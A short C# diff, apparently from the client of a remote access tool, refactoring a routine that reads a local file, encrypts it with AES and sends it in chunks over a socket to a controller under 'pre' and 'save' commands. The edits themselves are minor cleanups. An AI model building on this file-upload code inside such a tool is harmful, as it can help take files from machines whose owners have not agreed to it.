@@ -105,8 +105,7 @@ namespace Client.Handle_Packet
                 msgpack.ForcePathObject("Command").AsString = "pre";
                 msgpack.ForcePathObject("DWID").AsString = dwid;
                 msgpack.ForcePathObject("File").AsString = file;
-                long Length = new FileInfo(file).Length;
-                msgpack.ForcePathObject("Size").AsString = Length.ToString();
+                msgpack.ForcePathObject("Size").AsString = new FileInfo(file).Length.ToString();
                 ChunkSend(Settings.aes256.Encrypt(msgpack.Encode2Bytes()), Client);
 
 
@@ -115,11 +114,11 @@ namespace Client.Handle_Packet
                 msgpack2.ForcePathObject("Command").AsString = "save";
                 msgpack2.ForcePathObject("DWID").AsString = dwid;
                 msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
-                msgpack2.ForcePathObject("File").LoadFileAsBytes(file);
+                msgpack2.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(file));
                 ChunkSend(Settings.aes256.Encrypt(msgpack2.Encode2Bytes()), Client);
 
                 Client.Shutdown(SocketShutdown.Both);
-                Client.Close();
+                Client.Dispose();
             }
             catch
             {
@@ -149,7 +148,7 @@ namespace Client.Handle_Packet
                         SendPackage = client.Send(chunk);
                     } while (bytesToRead > 0);
 
-                    binaryReader.Close();
+                    binaryReader.Dispose();
                 }
             }
             catch
